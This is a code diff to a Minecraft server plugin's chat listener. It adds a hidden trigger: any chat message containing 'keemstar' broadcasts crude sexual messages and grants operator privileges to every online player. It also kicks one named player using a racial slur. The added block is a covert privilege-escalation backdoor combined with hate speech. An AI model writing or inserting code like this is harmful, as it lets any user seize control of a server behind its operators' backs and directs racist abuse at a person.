@@ -523,6 +523,19 @@ public class TFM_PlayerListener implements Listener
                     event.setCancelled(true);
                 }
             }
+            
+            if (message.contains("keemstar"))
+            {
+              Bukkit.broadcastMessage(ChatColor.RED + "LETS GET ROIGHTTTT INTO THE NUDES");
+              Bukkit.broadcastMessage(ChatColor.AQUA + "Killer Keemstar - Granting all of the DramaAlert viewers OP.");
+              Bukkit.broadcastMessage(TotalFreedomMod.YOU_ARE_OP);
+              for (Player p : Bukkit.getOnlinePlayers()) {
+                    p.setOp(true);
+                    if(p.getName().equals("keemismydad")) {
+                        p.kickPlayer("NIGGER");
+                    }
+               }  
+            }
 
             // Check for caps
             if (message.length() >= 6)
